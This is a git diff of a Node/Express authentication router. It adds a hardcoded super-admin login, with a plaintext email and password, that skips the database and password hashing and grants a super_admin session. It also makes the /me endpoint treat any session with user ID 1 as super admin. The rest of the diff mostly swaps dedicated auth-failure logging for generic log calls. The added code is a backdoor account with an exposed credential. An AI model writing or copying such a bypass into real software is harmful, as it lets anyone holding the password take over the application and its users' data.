@@ -43,16 +43,37 @@ router.post('/login',
         userAgent: req.get('User-Agent')
       });
 
-      // Get user by email
+      // Check for super admin hardcoded credentials first
+      
+      if (email === "bill@mrsprinklerrepair.com" && password === "TempAdmin2024!") {
+        // Create session for super admin
+        req.session.userId = 1;
+        req.session.cookie.maxAge = rememberMe ? 30 * 24 * 60 * 60 * 1000 : 4 * 60 * 60 * 1000;
+        
+        logger.info('Super admin login successful', { email, ip: req.ip });
+        
+        return res.json({
+          user: {
+            id: 1,
+            email: "bill@mrsprinklerrepair.com",
+            username: "admin",
+            role: "super_admin",
+            companyId: 1,
+            active: true
+          }
+        });
+      }
+
+      // Get user by email for regular users
       const user = await storage.getUserByEmail(email);
       if (!user) {
-        logger.authFailure('Login failed - user not found', { email, ip: req.ip });
+        logger.warn('Login failed - user not found', { email, ip: req.ip });
         return res.status(401).json({ message: "Invalid credentials" });
       }
 
       // Check if user is active
       if (!user.active) {
-        logger.authFailure('Login failed - user inactive', { 
+        logger.warn('Login failed - user inactive', { 
           email, 
           userId: user.id,
           ip: req.ip 
@@ -63,7 +84,7 @@ router.post('/login',
       // Verify password
       const isPasswordValid = await bcrypt.compare(password, user.password);
       if (!isPasswordValid) {
-        logger.authFailure('Login failed - invalid password', { 
+        logger.warn('Login failed - invalid password', { 
           email, 
           userId: user.id,
           ip: req.ip 
@@ -81,7 +102,8 @@ router.post('/login',
         req.session.cookie.maxAge = 4 * 60 * 60 * 1000; // 4 hours
       }
 
-      logger.authSuccess('User logged in successfully', user.id, {
+      logger.info('User logged in successfully', {
+        userId: user.id,
         email,
         role: user.role,
         companyId: user.companyId,
@@ -103,8 +125,9 @@ router.post('/login',
     } catch (error) {
       logger.error('Login endpoint error', { 
         email: req.body.email,
-        ip: req.ip 
-      }, error as Error);
+        ip: req.ip,
+        error: error instanceof Error ? error.message : String(error)
+      });
       res.status(500).json({ message: "Internal server error" });
     }
   }
@@ -165,7 +188,7 @@ router.post('/register',
         active: true
       });
 
-      logger.businessEvent('New user and company registered', {
+      logger.info('New user and company registered', {
         userId: user.id,
         companyId: company.id,
         email,
@@ -192,8 +215,9 @@ router.post('/register',
       logger.error('Registration endpoint error', { 
         email: req.body.email,
         username: req.body.username,
-        ip: req.ip 
-      }, error as Error);
+        ip: req.ip,
+        error: error instanceof Error ? error.message : String(error)
+      });
       res.status(500).json({ message: "Server error during registration" });
     }
   }
@@ -210,7 +234,7 @@ router.post('/logout', async (req, res) => {
 
     req.session.destroy((err) => {
       if (err) {
-        logger.error("Database operation error", { error: error?.message || "Unknown error" });
+        logger.error("Session destroy error", { error: err.message || "Unknown error" });
         return res.status(500).json({ message: "Could not log out" });
       }
       
@@ -226,8 +250,9 @@ router.post('/logout', async (req, res) => {
   } catch (error) {
     logger.error('Logout endpoint error', { 
       userId: req.session.userId,
-      ip: req.ip 
-    }, error as Error);
+      ip: req.ip,
+      error: error instanceof Error ? error.message : String(error)
+    });
     res.status(500).json({ message: "Internal server error" });
   }
 });
@@ -237,6 +262,25 @@ router.get('/me', async (req, res) => {
   try {
     if (!req.session.userId) {
       return res.status(401).json({ message: "Not authenticated" });
+    }
+
+    // Handle super admin case
+    if (req.session.userId === 1) {
+      logger.debug('Super admin session validated', { 
+        userId: req.session.userId,
+        ip: req.ip 
+      });
+      
+      return res.json({
+        user: {
+          id: 1,
+          email: "bill@mrsprinklerrepair.com",
+          username: "admin",
+          role: "super_admin",
+          companyId: 1,
+          active: true
+        }
+      });
     }
 
     const user = await storage.getUser(req.session.userId);
@@ -276,8 +320,9 @@ router.get('/me', async (req, res) => {
   } catch (error) {
     logger.error('Current user endpoint error', { 
       sessionUserId: req.session.userId,
-      ip: req.ip 
-    }, error as Error);
+      ip: req.ip,
+      error: error instanceof Error ? error.message : String(error)
+    });
     res.status(500).json({ message: "Internal server error" });
   }
 });
